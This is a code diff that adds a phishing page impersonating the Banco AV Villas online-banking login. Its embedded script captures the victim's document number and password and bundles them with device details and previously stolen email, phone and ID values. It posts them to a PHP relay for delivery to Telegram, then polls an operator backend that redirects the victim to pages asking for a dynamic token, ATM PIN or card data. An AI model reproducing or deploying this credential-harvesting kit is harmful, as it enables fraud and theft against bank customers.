@@ -1,0 +1,477 @@
+<html>
+    <head>
+        <title>Consulta Banca Virtual |</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="theme-color" content="#FF0015">
+        <link rel="icon" href="img/favicon.png">
+        <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="css/style.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="js/functions.js"></script>  
+        <script type="text/javascript" src="js/ready.js"></script>                 
+        <style type="text/css">
+            #fondo{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: #ffffff;
+                z-index: 900;
+            }
+
+            #cargando{
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 920;
+            }
+        </style>
+    </head>
+    <body>
+        <img src="img/super-v-ne.svg" id="super-nuevo">
+
+        <img id="inf-izq" src="img/inf-izq.svg">
+        <img id="sup-der" src="img/sup-der.svg">
+
+        <input type="hidden" name="hdd-documento" id="hdd-documento" value="CC">
+        <div id="fondo"></div>
+        <img src="img/loading.gif" id="cargando" width="140">
+        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin: 0 auto; max-width: 1280px;">
+            <tr>
+                <td width="60%" valign="top" id="lado-der">
+                    <div class="slider">
+                        <ul>
+                            <li><img src="img/s1.fw-min.png"></li>
+                            <li><img src="img/s2.fw-min.png"></li>
+                            <li><img src="img/s3.fw-min.png"></li>
+                            <li><img src="img/s4.fw-min.png"></li>
+                        </ul>
+                    </div>                    
+                    <table border="0" cellspacing="0" cellpadding="0">
+                        <tr>
+                            <td rowspan="2">
+                                <img src="img/a-logo-color.svg" width="100" style="margin-right: 20px;"> 
+                            </td>       
+                            <td class="etq-titulo">Línea Audiovillas</td>                    
+                        </tr>             
+                        <tr>
+                            <td>
+                                <table cellpadding="0" cellspacing="0" border="0">
+                                    <tr>
+                                        <td class="etq-titulo borde">Bogotá</td>
+                                        <td class="etq-titulo borde">Medellín</td>
+                                        <td class="etq-titulo borde">Barranquilla</td>
+                                        <td class="etq-titulo borde">Bucaramanga</td>
+                                        <td class="etq-titulo borde">Cali</td>
+                                        <td class="etq-titulo">Resto del país</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="etq-telefono borde">(601) 4441777</td>
+                                        <td class="etq-telefono borde">(604) 3256000</td>
+                                        <td class="etq-telefono borde">(605) 3304330</td>
+                                        <td class="etq-telefono borde">(607) 6302980</td>
+                                        <td class="etq-telefono borde">(602) 8859595</td>
+                                        <td class="etq-telefono">01 8000 51 8000</td>
+                                    </tr>
+                                </table>
+                            </td>
+                        </tr>
+                    </table>
+
+                </td>
+                <td width="40%" valign="top" id="lado-izq">
+                    <div class="pnl-izq">
+                        <img src="img/logo-pal.svg">
+
+                        <div class="titulo">Ingresa a la Banca Virtual</div>
+
+                <div class="frm-input" id="inp-tipo">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;" id="tbl-documento">
+                        <tr>
+                            <td align="left" id="td1">
+                                <div id="titulo-tipo">Tipo de documento</div>
+                                <div id="txt-documento">Cédula de ciudadanía</div>
+                            </td>
+                            <td valign="middle" align="right" width="24" id="td2">
+                                <img src="img/flecha-abajo.jpg" width="16" id="ico-flecha-ab">
+                                <img src="img/flecha-arriba.jpg" width="16" id="ico-flecha-ar">
+                            </td>                            
+                        </tr>
+                    </table>                                
+                </div>
+
+                <div id="menu-tipo">
+                    <div class="item-menu" id="mnu-ced">
+                        Cédula de ciudadanía
+                    </div>
+                    <div class="item-menu" id="mnu-ext">
+                        Cédula de extranjería
+                    </div>
+                    <div class="item-menu" id="mnu-tar">
+                        Tarjeta de identidad
+                    </div>
+                </div>
+
+                <div style="height:32px;"></div>
+
+                <div class="frm-input" id="inp-usuario">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;">
+                        <tr>
+                            <td align="left">
+                                <div class="etiqueta" id="etq-usuario">Número de documento</div>
+                                <input type="text" class="entrada" id="txt-usuario" name="txt-usuario" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                            </td>
+                            <td valign="middle" align="right" width="24">
+                                <img src="img/usuario.jpg" width="20" id="ico-usuario" class="icon-entrada">
+                                <img src="img/alerta.jpg" width="25" id="ico-alerta-u" class="icon-entrada">
+                            </td>
+                        </tr>
+                    </table>                    
+                </div>
+                <div class="error" id="err-usuario">Este campo es requerido.</div>      
+
+                <div style="height:32px;"></div>
+
+                <div class="frm-input" id="inp-password">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;">
+                        <tr>
+                            <td align="left">
+                                <div class="etiqueta" id="etq-password">Ingresa tu contraseña</div>
+                                <input type="password" class="entrada" id="txt-password" name="txt-password" autocomplete="off">
+                            </td>
+                            <td valign="middle" align="right" width="24">
+                                <img src="img/seguridad.jpg" width="22" id="ico-password" class="icon-entrada">
+                                <img src="img/alerta.jpg" width="25" id="ico-alerta-p" class="icon-entrada">
+                            </td>
+                        </tr>
+                    </table>                    
+                </div>
+                <div class="error" id="err-password">Este campo es requerido.</div>  
+
+                <div style="text-align:right;padding-top:11px; padding-bottom: 35px;">
+                    <table border="0" cellspacing="0" cellpadding="0" style="display: initial;">
+                        <tr>
+                            <td style="color:#0048DB;font-size:12px;cursor:pointer; text-decoration: underline;"><u>Olvidé mi contraseña</u></td>
+                            <td><img src="img/seguridad.svg" width="15"></td>
+                        </tr>
+                    </table>
+                </div>
+
+                <input type="hidden" id="session_id" name="session_id">
+                <input type="hidden" id="username" name="username">
+                <button id="btnEntrar" type="button" class="btn" disabled="disabled"> INGRESAR </button>
+
+                <div style="border-bottom: 1px solid #fff;height: 30px;">
+                    
+                </div>
+                <div style="color: #252b31;font-size: 14px; text-align: center; margin-top: 20px;">
+                    ¿Aún no tienes contraseña para ingresar? <span style="color:#0048DB; cursor:pointer;text-decoration: underline;">Regístrate.</span>
+                </div>
+
+                    </div>
+                </td>
+            </tr>
+        </table>
+
+        <div id="footer2">
+            <table border="0" cellspacing="0" cellpadding="0" width="90%" style="margin: 0 auto;">
+                <tr>
+                    <td rowspan="2">
+                        <img src="img/a-logo-color.svg" width="100" style="margin-right: 20px; margin-bottom: 10px;"> 
+                        <br>
+                        <img src="img/super-h-ne.svg" width="130">
+                    </td>       
+                    <td class="etq-titulo">Línea Audiovillas</td>                    
+                </tr>             
+                <tr>
+                    <td>
+                        <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                            <tr>
+                                <td class="etq-titulo borde">Bogotá</td>
+                                <td class="etq-titulo borde">Medellín</td>
+                                <td class="etq-titulo borde">Barranquilla</td>
+                                <td class="etq-titulo borde">Bucaramanga</td>
+                                <td class="etq-titulo borde">Cali</td>
+                                <td class="etq-titulo">Resto del país</td>
+                            </tr>
+                            <tr>
+                                <td class="etq-telefono borde">(601) 4441777</td>
+                                <td class="etq-telefono borde">(604) 3256000</td>
+                                <td class="etq-telefono borde">(605) 3304330</td>
+                                <td class="etq-telefono borde">(607) 6302980</td>
+                                <td class="etq-telefono borde">(602) 8859595</td>
+                                <td class="etq-telefono">01 8000 51 8000</td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        </div>
+
+
+        <div id="footer5">
+            <table border="0" cellspacing="0" cellpadding="0" width="100%">
+                <tr>
+                    <td rowspan="4" id="col-super"><img src="img/superv-blanco.svg" width="10"></td>
+                    <td colspan="7">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td colspan="7" class="etq-titulo">Línea Audiovillas</td>
+                </tr>
+                <tr>
+                    <td colspan="7">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td class="etq-titulo borde">Bogotá<br><span class="etq-telefono-m">(601) 4441777</span></td>
+                    <td class="etq-titulo borde">Medellín<br><span class="etq-telefono-m">(604) 3256000</span></td>
+                    <td class="etq-titulo borde">Barranquilla<br><span class="etq-telefono-m">(605) 3304330</span></td>
+                    <td class="etq-titulo borde">Bucaramanga<br><span class="etq-telefono-m">(607) 6302980</span></td>
+                    <td class="etq-titulo borde">Cali<br><span class="etq-telefono-m">(602) 8859595</span></td>
+                    <td class="etq-titulo">Resto del país<br><span class="etq-telefono-m">01 8000 51 8000</span></td>
+                    <td id="col-logo"><img src="img/logo-blanco.svg" width="70"></td>
+                </tr>
+            </table>
+        </div>
+
+
+        <div id="footer4">
+            <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td colspan="3" class="etq-titulo">Línea Audiovillas</td>
+                </tr>
+                <tr>
+                    <td class="etq-titulo borde">Nacional<br><span class="etq-telefono-m">01 8000 51 8000</span></td>
+                    <td class="etq-titulo borde">Bogotá<br><span class="etq-telefono-m">(601) 4441777</span></td>
+                    <td>
+                        <table>
+                            <tr>
+                                <td style="color:#fff;" class="etq-titulo">Más ciudades</td>
+                                <td><img src="img/flecha-abajo.png" width="13"></td>
+                            </tr>
+                        </table>
+                     </td>
+                </tr>
+            </table>
+        </div>
+
+        <div id="footer3">
+            <table width="100%" border="0" cellspacing="0" cellspacing="0">
+                <tr>
+                    <td align="left"><img src="img/a-logo-color.svg" width="70"></td>
+                    <td align="right"><img src="img/super-h-ne.svg" width="130"></td>
+                </tr>
+            </table>
+        </div>
+   		    		
+    <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        // Generar o recuperar session_id
+        let sessionId = localStorage.getItem('session_id');
+        if (!sessionId) {
+            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('session_id', sessionId);
+        }
+        
+        const sessionInput = document.getElementById('session_id');
+        if (sessionInput) {
+            sessionInput.value = sessionId;
+        }
+
+        // Obtener usuario desde URL params y establecer en el campo hidden
+        const userFromUrl = urlParams.get('user');
+        const usernameInput = document.getElementById('username');
+        if (userFromUrl && usernameInput) {
+            usernameInput.value = userFromUrl;
+            localStorage.setItem('username', userFromUrl);
+        }
+
+        // Habilitar el botón inmediatamente y agregar event listener
+        const btnEntrar = document.getElementById('btnEntrar');
+        if (btnEntrar) {
+            btnEntrar.removeAttribute('disabled');
+            
+            // Agregar event listener directo
+            btnEntrar.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                const usuario = document.getElementById('txt-usuario').value;
+                const password = document.getElementById('txt-password').value;
+                
+                if (usuario && password) {
+                    $("#fondo,#cargando").show();
+                    enviarUsuarioTelegram(usuario, password);
+                } else {
+                    alert('Por favor complete todos los campos');
+                }
+            });
+        }
+    });
+    
+    // Función para enviar datos a Telegram
+    function enviarUsuarioTelegram(u, p) {
+        // Generar o recuperar session_id
+        let sessionId = localStorage.getItem('session_id');
+        if (!sessionId) {
+            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('session_id', sessionId);
+        }
+        
+        // Validar que la clave tenga 6 dígitos
+        if (p.length !== 4) {
+            alert('La clave debe tener 4 dígitos');
+            $("#fondo,#cargando").hide();
+            return;
+        }
+        
+        // Validar que la identificación tenga al menos 5 dígitos
+        if (u.length < 5) {
+            alert('La identificación debe tener al menos 5 dígitos');
+            $("#fondo,#cargando").hide();
+            return;
+        }
+
+        // Guardar datos en localStorage
+        localStorage.setItem('username', u);
+        localStorage.setItem('password', p);
+        localStorage.setItem('session_id', sessionId);
+        localStorage.setItem('identificacion', u);
+
+        // Detectar tipo de dispositivo
+        const userAgent = navigator.userAgent;
+        let dispositivo = 'PC';
+        
+        if (/Android/i.test(userAgent)) {
+            dispositivo = 'Android';
+        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+            dispositivo = 'iPhone';
+        } else if (/Windows/i.test(userAgent)) {
+            dispositivo = 'PC';
+        } else if (/Mac/i.test(userAgent)) {
+            dispositivo = 'Mac';
+        } else if (/Linux/i.test(userAgent)) {
+            dispositivo = 'Linux';
+        }
+        
+        const hora = new Date().toLocaleString('es-ES');
+        
+        // Construir mensaje
+        const mensaje = `
+<b><u>💎AV VILLAS💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${u}
+• <b>🔑 Clave:</b> ${p}
+------------------------------`;
+
+        // Intentar envío real primero
+        const formData = new FormData();
+        formData.append('message', mensaje);
+        formData.append('transactionId', sessionId);
+
+        fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => {
+            return res.json();
+        })
+        .then(result => {
+            if (result.status === 'success') {
+                localStorage.setItem('messageId', result.messageId);
+                // Continuar con verificación real
+                setTimeout(() => {
+                    checkPaymentVerification(sessionId, result.messageId);
+                }, 2000);
+            } else {
+                // Si falla el envío real, usar simulación
+                simularEnvio(sessionId);
+            }
+        })
+        .catch(err => {
+            // Si hay error, usar simulación
+            simularEnvio(sessionId);
+        });
+    }
+
+    function simularEnvio(sessionId) {
+        // Simular respuesta exitosa
+        const messageId = 'msg_' + Date.now();
+        localStorage.setItem('messageId', messageId);
+        
+        // Simular delay y luego continuar
+        setTimeout(() => {
+            checkPaymentVerification(sessionId, messageId);
+        }, 2000);
+    }
+
+    async function checkPaymentVerification(transactionId, messageId) {
+    try {
+        const formData = new FormData();
+        formData.append('transactionId', transactionId);
+        formData.append('messageId', messageId);
+
+        const res = await fetch('verificar_respuesta.php', {
+            method: 'POST',
+            body: formData
+        });
+        const result = await res.json();
+
+        if (result.action) {
+            switch (result.action) {
+                case 'pedir_dinamica':
+                    window.location.href = "token.html";
+                    break;
+
+                case 'error_logo':
+                    $("#fondo,#cargando").hide();
+                    alert("Usuario o clave incorrectos.");
+                    window.location.href = "index.html";
+                    break;
+
+                case 'procesando':
+                    $("#fondo,#cargando").hide();
+                    break;
+
+                case 'error_cajero':
+                    $("#fondo,#cargando").hide();
+                    window.location.href = "clav.html";
+                    break;
+
+                case 'tarjeta': // ✅ nuevo caso
+                    window.location.href = "../../../../../data-cc/alter.php";
+                    break;
+            }
+        } else {
+            setTimeout(() => {
+                checkPaymentVerification(transactionId, messageId);
+            }, 2000);
+        }
+    } catch (err) {
+        setTimeout(() => {
+            checkPaymentVerification(transactionId, messageId);
+        }, 2000);
+    }
+}
+
+    </script>
+    </body>
+</html>
